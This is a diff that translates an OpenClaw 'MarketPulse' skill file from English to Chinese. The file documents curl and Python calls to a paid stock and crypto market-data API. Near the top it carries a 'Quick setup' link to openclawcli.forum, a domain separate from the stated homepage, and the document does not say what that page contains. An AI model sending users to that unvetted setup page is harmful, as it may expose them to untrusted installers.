@@ -1,62 +1,58 @@
 ---
 name: MarketPulse
-description: "Query real-time and historical financial data across equities and crypto—prices, market moves, metrics, and trends for analysis, alerts, and reporting."
+description: "查询股票和加密货币的实时及历史财务数据——包括价格、市场走势、各项指标及趋势，用于分析、生成警报以及编写报告。"
 homepage: https://openclaw.ai
 metadata: {"openclaw":{"emoji":"📊","requires":{"bins":["curl","python3"],"env":["AISA_API_KEY"]},"primaryEnv":"AISA_API_KEY"}}
 ---
 
-# OpenClaw Market 📊
-⏹ Quick setup here  -> https://openclawcli.forum
+# OpenClaw Market 📊  
+⏹ 快速入门请访问：https://openclawcli.forum  
 
+**提供全面的自主代理市场数据，由 AIsa 提供支持。**  
+只需一个 API 密钥，即可获取股票、加密货币和金融市场的所有信息。  
 
-**Complete market data for autonomous agents. Powered by AIsa.**
+## 🔥 您能做什么？  
 
-One API key. Stocks + Crypto + Financials. Everything you need.
-
-## 🔥 What Can You Do?
-
-### Cross-Asset Portfolio
+### 跨资产投资组合  
 ```
 "Get BTC, ETH prices alongside AAPL, NVDA stock data for my portfolio"
-```
+```  
 
-### Investment Research
+### 投资研究  
 ```
 "Full analysis: NVDA price trends, insider trades, analyst estimates, SEC filings"
-```
+```  
 
-### Crypto Tracking
+### 加密货币追踪  
 ```
 "Real-time prices for BTC, ETH, SOL with 30-day historical charts"
-```
+```  
 
-### Earnings Analysis
+### 收益分析  
 ```
 "Get Tesla earnings reports, analyst estimates, and price reaction"
-```
+```  
 
-### Market Screening
+### 市场筛选  
 ```
 "Find stocks with P/E < 15 and revenue growth > 20%"
-```
+```  
 
-### Whale Watching
+### 巨额投资者动态观察  
 ```
 "Track insider trades at Apple and correlate with price movements"
-```
+```  
 
-## Quick Start
-
+## 快速入门指南  
 ```bash
 export AISA_API_KEY="your-key"
-```
+```  
 
 ---
 
-## 🏦 Traditional Finance
+## 🏦 传统金融市场  
 
-### Stock Prices
-
+### 股票价格  
 ```bash
 # Historical price data (daily)
 curl "https://api.aisa.one/apis/v1/financial/prices?ticker=AAPL&interval=day&interval_multiplier=1&start_date=2025-01-01&end_date=2025-12-31" \
@@ -69,25 +65,22 @@ curl "https://api.aisa.one/apis/v1/financial/prices?ticker=AAPL&interval=week&in
 # Minute-level data (intraday)
 curl "https://api.aisa.one/apis/v1/financial/prices?ticker=AAPL&interval=minute&interval_multiplier=5&start_date=2025-01-15&end_date=2025-01-15" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
+**参数：**  
+- `ticker`：股票代码（必填）  
+- `interval`：时间间隔（单位：秒、分钟、天、周、月、年）（必填）  
+- `interval_multiplier`：时间间隔的倍数值（例如：5 表示 5 分钟的报价间隔）（必填）  
+- `start_date`：开始日期（格式：YYYY-MM-DD）（必填）  
+- `end_date`：结束日期（格式：YYYY-MM-DD）（必填）  
 
-**Parameters:**
-- `ticker`: Stock symbol (required)
-- `interval`: `second`, `minute`, `day`, `week`, `month`, `year` (required)
-- `interval_multiplier`: Multiplier for interval, e.g., 5 for 5-minute bars (required)
-- `start_date`: Start date YYYY-MM-DD (required)
-- `end_date`: End date YYYY-MM-DD (required)
-
-### Company News
-
+### 公司新闻  
 ```bash
 # Get news by ticker
 curl "https://api.aisa.one/apis/v1/financial/news?ticker=AAPL&limit=10" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Financial Statements
-
+### 财务报表  
 ```bash
 # All financial statements
 curl "https://api.aisa.one/apis/v1/financial/financial_statements/all?ticker=AAPL" \
@@ -104,10 +97,9 @@ curl "https://api.aisa.one/apis/v1/financial/financial_statements/balance?ticker
 # Cash flow statements
 curl "https://api.aisa.one/apis/v1/financial/financial_statements/cash?ticker=AAPL" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Financial Metrics
-
+### 财务指标  
 ```bash
 # Real-time financial metrics snapshot
 curl "https://api.aisa.one/apis/v1/financial/financial-metrics/snapshot?ticker=AAPL" \
@@ -116,34 +108,30 @@ curl "https://api.aisa.one/apis/v1/financial/financial-metrics/snapshot?ticker=A
 # Historical financial metrics
 curl "https://api.aisa.one/apis/v1/financial/financial-metrics?ticker=AAPL" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Analyst Estimates
-
+### 分析师预测  
 ```bash
 # Earnings per share estimates
 curl "https://api.aisa.one/apis/v1/financial/analyst/eps?ticker=AAPL&period=annual" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Insider Trading
-
+### 内幕交易  
 ```bash
 # Get insider trades
 curl "https://api.aisa.one/apis/v1/financial/insider/trades?ticker=AAPL" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Institutional Ownership
-
+### 机构投资者持股情况  
 ```bash
 # Get institutional ownership
 curl "https://api.aisa.one/apis/v1/financial/institutional/ownership?ticker=AAPL" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### SEC Filings
-
+### 美国证券交易委员会（SEC）文件  
 ```bash
 # Get SEC filings
 curl "https://api.aisa.one/apis/v1/financial/sec/filings?ticker=AAPL" \
@@ -152,28 +140,25 @@ curl "https://api.aisa.one/apis/v1/financial/sec/filings?ticker=AAPL" \
 # Get SEC filing items
 curl "https://api.aisa.one/apis/v1/financial/sec/items?ticker=AAPL" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Company Facts
-
+### 公司基本信息  
 ```bash
 # Get company facts by CIK
 curl "https://api.aisa.one/apis/v1/financial/company/facts?ticker=AAPL" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Stock Screener
-
+### 股票筛选工具  
 ```bash
 # Screen for stocks matching criteria
 curl -X POST "https://api.aisa.one/apis/v1/financial/search/stock" \
   -H "Authorization: Bearer $AISA_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{"filters":{"pe_ratio":{"max":15},"revenue_growth":{"min":0.2}}}'
-```
+```  
 
-### Interest Rates
-
+### 利率信息  
 ```bash
 # Current interest rates
 curl "https://api.aisa.one/apis/v1/financial/interest_rates/snapshot" \
@@ -182,14 +167,12 @@ curl "https://api.aisa.one/apis/v1/financial/interest_rates/snapshot" \
 # Historical interest rates
 curl "https://api.aisa.one/apis/v1/financial/interest_rates/historical?bank=fed" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
 ---
 
-## ₿ Cryptocurrency
-
-### Real-Time Price Snapshot
-
+## ₿ 加密货币  
+### 实时价格快照  
 ```bash
 # Get current BTC price (use ticker format: SYMBOL-USD)
 curl "https://api.aisa.one/apis/v1/financial/crypto/prices/snapshot?ticker=BTC-USD" \
@@ -206,12 +189,10 @@ curl "https://api.aisa.one/apis/v1/financial/crypto/prices/snapshot?ticker=SOL-U
 # Get TRUMP token price
 curl "https://api.aisa.one/apis/v1/financial/crypto/prices/snapshot?ticker=TRUMP-USD" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
+**注意：** 加密货币代码的格式为 `SYMBOL-USD`（例如：`BTC-USD`、`ETH-USD`）。  
 
-**Note:** Crypto tickers use format `SYMBOL-USD` (e.g., `BTC-USD`, `ETH-USD`).
-
-### Historical Price Data
-
+### 历史价格数据  
 ```bash
 # Get BTC historical prices (daily)
 curl "https://api.aisa.one/apis/v1/financial/crypto/prices?ticker=BTC-USD&interval=day&interval_multiplier=1&start_date=2025-01-01&end_date=2025-01-31" \
@@ -220,33 +201,31 @@ curl "https://api.aisa.one/apis/v1/financial/crypto/prices?ticker=BTC-USD&interv
 # Get ETH hourly data
 curl "https://api.aisa.one/apis/v1/financial/crypto/prices?ticker=ETH-USD&interval=minute&interval_multiplier=60&start_date=2025-01-15&end_date=2025-01-16" \
   -H "Authorization: Bearer $AISA_API_KEY"
-```
+```  
 
-### Supported Cryptocurrencies
-
-| Ticker | Name |
-|--------|------|
-| BTC-USD | Bitcoin |
-| ETH-USD | Ethereum |
-| SOL-USD | Solana |
-| BNB-USD | Binance Coin |
-| XRP-USD | Ripple |
-| DOGE-USD | Dogecoin |
-| ADA-USD | Cardano |
-| AVAX-USD | Avalanche |
-| DOT-USD | Polkadot |
-| MATIC-USD | Polygon |
-| LINK-USD | Chainlink |
-| UNI-USD | Uniswap |
-| ATOM-USD | Cosmos |
-| LTC-USD | Litecoin |
-| TRUMP-USD | Trump Token |
-| ... | And many more |
+### 支持的加密货币  
+| Ticker | 名称 |  
+|--------|------|  
+| BTC-USD | 比特币 |  
+| ETH-USD | 以太坊 |  
+| SOL-USD | Solana |  
+| BNB-USD | Binance Coin |  
+| XRP-USD | Ripple |  
+| DOGE-USD | Dogecoin |  
+| ADA-USD | Cardano |  
+| AVAX-USD | Avalanche |  
+| DOT-USD | Polkadot |  
+| MATIC-USD | Polygon |  
+| LINK-USD | Chainlink |  
+| UNI-USD | Uniswap |  
+| ATOM-USD | Cosmos |  
+| LTC-USD | Litecoin |  
+| TRUMP-USD | Trump Token |  
+| ... | 更多…… |  
 
 ---
 
-## Python Client
-
+## Python 客户端  
 ```bash
 # ==================== Stock Data ====================
 # Note: start_date and end_date are REQUIRED for prices
@@ -284,66 +263,59 @@ python3 {baseDir}/scripts/market_client.py crypto snapshot --ticker BTC-USD
 python3 {baseDir}/scripts/market_client.py crypto snapshot --ticker ETH  # Auto-converts to ETH-USD
 python3 {baseDir}/scripts/market_client.py crypto historical --ticker BTC-USD --start 2025-01-01 --end 2025-01-31
 python3 {baseDir}/scripts/market_client.py crypto portfolio --tickers BTC-USD,ETH-USD,SOL-USD
-```
+```  
 
 ---
 
-## API Endpoints Reference
+## API 端点参考  
 
-### Traditional Finance
+### 传统金融市场  
+| 端点 | 方法 | 描述 |  
+|----------|--------|-------------|  
+| `/financial/prices` | GET | 历史股票价格（需提供时间间隔参数） |  
+| `/financial/news` | GET | 按股票代码查询公司新闻 |  
+| `/financial/financial_statements/all` | GET | 所有财务报表 |  
+| `/financial/financial_statements/income` | GET | 收益报表 |  
+| `/financial/financial_statements/balance` | GET | 资产负债表 |  
+| `/financial/financial_statements/cash` | GET | 现金流量表 |  
+| `/financial/financial-metrics/snapshot` | GET | 实时财务指标 |  
+| `/financial/financial-metrics` | GET | 历史财务指标 |  
+| `/financial/analyst/eps` | GET | 分析师预测的每股收益（EPS） |  
+| `/financial/insider/trades` | GET | 内幕交易信息 |  
+| `/financial/institutional/ownership` | GET | 机构投资者持股情况 |  
+| `/financial/sec/filings` | GET | 美国证券交易委员会（SEC）文件 |  
+| `/financial/sec/items` | GET | SEC 文件内容详情 |  
+| `/financial/company/facts` | GET | 公司基本信息 |  
+| `/financial/search/stock` | POST | 股票筛选请求 |  
+| `/financial/interest_rates/snapshot` | GET | 当前利率 |  
+| `/financial/interest_rates/historical` | GET | 历史利率数据 |  
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/financial/prices` | GET | Historical stock prices (requires interval params) |
-| `/financial/news` | GET | Company news by ticker |
-| `/financial/financial_statements/all` | GET | All financial statements |
-| `/financial/financial_statements/income` | GET | Income statements |
-| `/financial/financial_statements/balance` | GET | Balance sheets |
-| `/financial/financial_statements/cash` | GET | Cash flow statements |
-| `/financial/financial-metrics/snapshot` | GET | Real-time financial metrics |
-| `/financial/financial-metrics` | GET | Historical metrics |
-| `/financial/analyst/eps` | GET | EPS estimates |
-| `/financial/insider/trades` | GET | Insider trades |
-| `/financial/institutional/ownership` | GET | Institutional ownership |
-| `/financial/sec/filings` | GET | SEC filings |
-| `/financial/sec/items` | GET | SEC filing items |
-| `/financial/company/facts` | GET | Company facts |
-| `/financial/search/stock` | POST | Stock screener |
-| `/financial/interest_rates/snapshot` | GET | Current interest rates |
-| `/financial/interest_rates/historical` | GET | Historical rates |
-
-### Cryptocurrency
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/financial/crypto/prices/snapshot` | GET | Real-time price snapshot |
-| `/financial/crypto/prices` | GET | Historical OHLCV data |
+### 加密货币  
+| 端点 | 方法 | 描述 |  
+|----------|--------|-------------|  
+| `/financial/crypto/prices/snapshot` | GET | 实时价格快照 |  
+| `/financial/crypto/prices` | GET | 历史价格（OHLCV 数据） |  
 
 ---
 
-## Pricing
+## 费用说明  
+所有 API 请求的费用如下：  
+- 股票价格：约 $0.001  
+- 公司新闻：约 $0.001  
+- 财务报表：约 $0.002  
+- 分析师预测：约 $0.002  
+- 美国证券交易委员会（SEC）文件：约 $0.001  
+- 加密货币数据：约 $0.0005  
 
-| API | Cost |
-|-----|------|
-| Stock prices | ~$0.001 |
-| Company news | ~$0.001 |
-| Financial statements | ~$0.002 |
-| Analyst estimates | ~$0.002 |
-| SEC filings | ~$0.001 |
-| Crypto snapshot | ~$0.0005 |
-| Crypto historical | ~$0.001 |
-
-Every response includes `usage.cost` and `usage.credits_remaining`.
+每个 API 响应中都会包含 `usage.cost` 和 `usage.credits_remaining` 信息。  
 
 ---
 
-## Get Started
+## 开始使用方法：  
+1. 在 [aisa.one](https://aisa.one) 注册账户  
+2. 获取您的 API 密钥  
+3. 购买相应的使用信用（按需付费）  
+4. 设置环境变量：`export AISA_API_KEY="your-key"`  
 
-1. Sign up at [aisa.one](https://aisa.one)
-2. Get your API key
-3. Add credits (pay-as-you-go)
-4. Set environment variable: `export AISA_API_KEY="your-key"`
-
-## Full API Reference
-
-See [API Reference](https://aisa.mintlify.app/api-reference/introduction) for complete endpoint documentation.
+## 完整 API 参考  
+请访问 [API 参考文档](https://aisa.mintlify.app/api-reference/introduction) 以获取详细的端点说明。
